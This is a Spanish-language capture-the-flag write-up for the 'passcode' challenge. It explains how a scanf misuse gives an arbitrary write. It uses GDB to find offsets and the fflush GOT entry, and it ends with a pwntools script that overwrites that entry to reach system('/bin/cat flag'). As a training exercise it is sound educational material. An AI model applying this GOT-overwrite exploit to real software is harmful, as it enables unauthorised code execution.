@@ -1,0 +1,186 @@
+I"~><p class="lead">Tenemos un GOT overwrite donde a través de la escritura arbitraria, podemos sobreescribir la entrada .GOT de fflush() por la dirección de system(bin/cat flag) y leer la flag</p>
+
+<h2 id="analisis-del-binario">Analisis del binario</h2>
+
+<h3 id="funcion-main">Funcion main</h3>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"Toddler's Secure Login System 1.0 beta.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+	<span class="n">welcome</span><span class="p">();</span>
+	<span class="n">login</span><span class="p">();</span>
+
+	<span class="c1">// something after login...</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"Now I can safely trust you that you have credential :)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>	
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Lo unico que hace es llamar a dos funciones: <code class="language-plaintext highlighter-rouge">welcome</code> y <code class="language-plaintext highlighter-rouge">login</code> e imprimer unos cuantos mensajes</p>
+
+<h3 id="funcion-welcome">Funcion welcome</h3>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">welcome</span><span class="p">(){</span>
+	<span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"enter you name : "</span><span class="p">);</span>
+	<span class="n">scanf</span><span class="p">(</span><span class="s">"%100s"</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"Welcome %s!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Vemos que se declara un buffer de 100, basicamente esta funcion toma 100 caracteres los cuales los guarda en la variable <code class="language-plaintext highlighter-rouge">name</code> e imprime el mensaje <code class="language-plaintext highlighter-rouge">Welcome</code> y lo que tenga <code class="language-plaintext highlighter-rouge">name</code></p>
+
+<h3 id="funcion-login">Funcion login</h3>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">login</span><span class="p">(){</span>
+	<span class="kt">int</span> <span class="n">passcode1</span><span class="p">;</span>
+	<span class="kt">int</span> <span class="n">passcode2</span><span class="p">;</span>
+
+	<span class="n">printf</span><span class="p">(</span><span class="s">"enter passcode1 : "</span><span class="p">);</span>
+	<span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="n">passcode1</span><span class="p">);</span>
+	<span class="n">fflush</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>
+
+	<span class="c1">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"enter passcode2 : "</span><span class="p">);</span>
+        <span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="n">passcode2</span><span class="p">);</span>
+
+	<span class="n">printf</span><span class="p">(</span><span class="s">"checking...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">passcode1</span><span class="o">==</span><span class="mi">338150</span> <span class="o">&amp;&amp;</span> <span class="n">passcode2</span><span class="o">==</span><span class="mi">13371337</span><span class="p">){</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"Login OK!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+                <span class="n">system</span><span class="p">(</span><span class="s">"/bin/cat flag"</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">else</span><span class="p">{</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"Login Failed!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+		<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Después de eso tenemos la funcion <code class="language-plaintext highlighter-rouge">login()</code> que lee dos números enteros, luego los compara con dos constantes y, si coinciden obtenemos la bandera</p>
+
+<p>Todo parece muy simple, pero si intentamos correrlo pasandole esos valores con los que se compara, veremos algo como esto:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>passcode@pwnable:~$ ./passcode 
+Toddler's Secure Login System 1.0 beta.
+enter you name : c4rta
+Welcome c4rta!
+enter passcode1 : 338150
+Segmentation fault (core dumped)
+</code></pre></div></div>
+<p>Peto, pero como es que peto si parece que espera un tipo de dato int y encima el que le pasamos es igual a <code class="language-plaintext highlighter-rouge">338150</code> que es el primer valor con el que se compara.</p>
+
+<p>Aqui una recomendacion es que si tiene el codigo fuente, lo vuelvan a compilar para ver si tiene algunos warnings y en este caso nos muestra eso:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>passcode.c: In function ‘login’:
+passcode.c:9:8: warning: format ‘%d’ expects argument of type ‘int *’, but argument 2 has type ‘int’ [-Wformat=]
+    scanf("%d", passcode1);
+    ^
+</code></pre></div></div>
+
+<p>Con esto nos podemos dar cuenta el input que se guarda en <code class="language-plaintext highlighter-rouge">passcode1</code> no se interpreta como un int, si no como una direccion, de hecho ahi nos dice que espera un <code class="language-plaintext highlighter-rouge">int *</code>, esto deriva de un <code class="language-plaintext highlighter-rouge">arbitrary write</code>, en la cual es la variable <code class="language-plaintext highlighter-rouge">passcode1</code> podemos poner lo que queramos</p>
+
+<h3 id="depurandolo-con-gdb">Depurandolo con GDB</h3>
+
+<p>Aqui me ire directamente a la funcion <code class="language-plaintext highlighter-rouge">login()</code> para que puedan ver que las variables se tratan como direcciones (les recomiendo que lo pongan con sintaxis intel, la sintaxis at&amp;t esta medio pedorra: <code class="language-plaintext highlighter-rouge">set disassembly-flavor intel</code>)</p>
+
+<p>Quiero destacar algo, generalmente en ensamblador para acceder a las varibles de una funcion se hace uso del <code class="language-plaintext highlighter-rouge">EBP</code>, esto lo digo ya que podemos tener una idea de donde se encuentran nuestras variables, quiero resaltar esto:</p>
+
+<p><img src="/assets/img/passcode/1.png" alt="" /></p>
+
+<p>Puede ser que lo que esta en <code class="language-plaintext highlighter-rouge">ebp-0x10</code> sea la variable passcode asi que para corroborar eso pondre un breakpoint alli e ejecutare el programa:</p>
+
+<p>Como se puede ver:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) x/xw $ebp-0x10
+0xffefef58:	0xf7586cbb
+</code></pre></div></div>
+<p>La variable <code class="language-plaintext highlighter-rouge">passcode1</code> (ebp-0x10) esta apuntando a <code class="language-plaintext highlighter-rouge">0xf7586cbb</code>, que es la direccion en la que esta escribiendo en <code class="language-plaintext highlighter-rouge">scanf()</code></p>
+
+<p>Ademas podemos ver que en las comparaciones:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cmp    DWORD PTR [ebp-0x10],0x528e6
+DWORD PTR [ebp-0xc],0xcc07c9
+</code></pre></div></div>
+
+<p>Esta comparando direcciones <code class="language-plaintext highlighter-rouge">0x528e6</code> y <code class="language-plaintext highlighter-rouge">0xcc07c9</code> no un valor, entonces el código intenta cargar la dirección de <code class="language-plaintext highlighter-rouge">passcode1</code> y <code class="language-plaintext highlighter-rouge">passcode2</code> que obviamente no existen. Esa es la razon por la que el programa peta</p>
+
+<h2 id="explotacion">Explotacion</h2>
+
+<p>Si sabemos que tenenemos una escritura arbitraria para poder sobrescribir el valor de passcode1, ¿Entonces como nos aprovechamos de esto?, pues debemos de aplicar otra tecnica llamada GOT overwrite</p>
+
+<p>En el código de login() después de scanf lo que sigue después es fflush(stdin), esto puede ser usado para realizar un “salto” hacía una dirección. Si te das cuenta, cuando vemos el código te la función fflush(), está usando la instrucción jmp para saltar a <code class="language-plaintext highlighter-rouge">0x804a004</code> , además fflush está referenciada por .PLT y eso lo podemos ver en <code class="language-plaintext highlighter-rouge">fflush@PLT</code> así que fflush() debe de tener una entrada en .GOT a la que va a saltar, ademas, gracias a qué scanf() está antes que fflush(), nosotros podemos controlar <code class="language-plaintext highlighter-rouge">0x804a004</code>, la idea es:</p>
+
+<ul>
+  <li>
+    <p>Mandar los suficientes bytes para llenar el buffer</p>
+  </li>
+  <li>
+    <p>Sobreescribir passcode1 por 0x804a004, y eso nos permitirá una escritura arbitraria en fflush@GOT</p>
+  </li>
+  <li>
+    <p>Y a través de la escritura arbitraria, podemos sobreescribir la entrada .GOT de fflush() por la dirección de system(bin/cat flag)</p>
+  </li>
+</ul>
+
+<h3 id="desplazamiento-para-passcode1">Desplazamiento para passcode1</h3>
+
+<p>Lo primero que hay que obtener es el desplazamiento para llegar a <code class="language-plaintext highlighter-rouge">passcode1</code>, y es bien facil, simplemente podemos hacer una resta de la ubicacion de la variable <code class="language-plaintext highlighter-rouge">name</code> la que recibe nuestro primer input, con la ubicacion de la variable <code class="language-plaintext highlighter-rouge">passcode</code> y la variable <code class="language-plaintext highlighter-rouge">name</code> esta <code class="language-plaintext highlighter-rouge">0x70</code> por debajo de <code class="language-plaintext highlighter-rouge">EBP</code>, deja te muesto.</p>
+
+<p>En la funcion <code class="language-plaintext highlighter-rouge">welcome()</code> hay una linea como esta:</p>
+
+<p><code class="language-plaintext highlighter-rouge">0x0804862f &lt;+38&gt;:	lea    edx,[ebp-0x70]</code></p>
+
+<p>La cual usa el registro <code class="language-plaintext highlighter-rouge">EDX</code> este registro es usado para menejar las operaciones I/0, asi que pondre un breakpoint donde se recibe nuestro input</p>
+
+<p><code class="language-plaintext highlighter-rouge">b *0x08048643</code></p>
+
+<p>Ahora si yo muestro lo que tiene <code class="language-plaintext highlighter-rouge">ebp-0x70</code> veremos algo como esto:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) r
+Starting program: /home/passcode/passcode 
+Toddler's Secure Login System 1.0 beta.
+enter you name : c4rta --&gt; Mi input
+
+Breakpoint 1, 0x08048643 in welcome ()
+(gdb) x/1s $ebp-0x70
+0xffa1a2c8:	"c4rta" --&gt; El valor que tiene
+(gdb) 
+</code></pre></div></div>
+
+<p>Ahora esta comprobado que en <code class="language-plaintext highlighter-rouge">ebp-0x70</code> esta la variable <code class="language-plaintext highlighter-rouge">name</code>.</p>
+
+<p>Asi que para sacar el desplazamiento para llegar a <code class="language-plaintext highlighter-rouge">passcode1</code> hacemos <code class="language-plaintext highlighter-rouge">0x70 - 0x10</code>, y esto nos da <code class="language-plaintext highlighter-rouge">96</code> es decimal</p>
+
+<h3 id="direccion-de-fflush">Direccion de fflush</h3>
+
+<p>Primero hay que mostrar el contenido de la funcion:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) disas fflush
+Dump of assembler code for function fflush@plt:
+   0x08048430 &lt;+0&gt;:	jmp    *0x804a004
+   0x08048436 &lt;+6&gt;:	push   $0x8
+   0x0804843b &lt;+11&gt;:	jmp    0x8048410
+End of assembler dump.
+</code></pre></div></div>
+
+<p>Vemos que la entrada de <code class="language-plaintext highlighter-rouge">fflush</code> esta con la direccion <code class="language-plaintext highlighter-rouge">0x804a004</code> y su valor es <code class="language-plaintext highlighter-rouge">0x08048436</code> que es cuando se hace el <code class="language-plaintext highlighter-rouge">push</code>. y esta direccion la ocupamos ya que sobrescribiremos <code class="language-plaintext highlighter-rouge">fflush</code> para que llame a <code class="language-plaintext highlighter-rouge">/bin/cat flag</code> que esta en la direccion <code class="language-plaintext highlighter-rouge">0x080485e3</code></p>
+
+<h3 id="crafteando-el-exploit">Crafteando el exploit</h3>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s">"i386"</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s">"linux"</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./passcode"</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span> <span class="o">*</span> <span class="mi">96</span>             <span class="c1"># desplazamiento para passcode
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0804a004</span><span class="p">)</span>      <span class="c1"># direccion de la entrada GOT de fflush
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mh">0x080485e3</span><span class="p">))</span>  <span class="c1"># direccion de bin/cat flag
+</span>
+<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">())</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvall</span><span class="p">())</span>
+</code></pre></div></div>
+<p>Y nos da la flag la cual es: <code class="language-plaintext highlighter-rouge">Sorry mom.. I got confused about scanf usage :(</code></p>
+
+<p>Eso ha sido todo, gracias por leer ❤</p>
+:ET
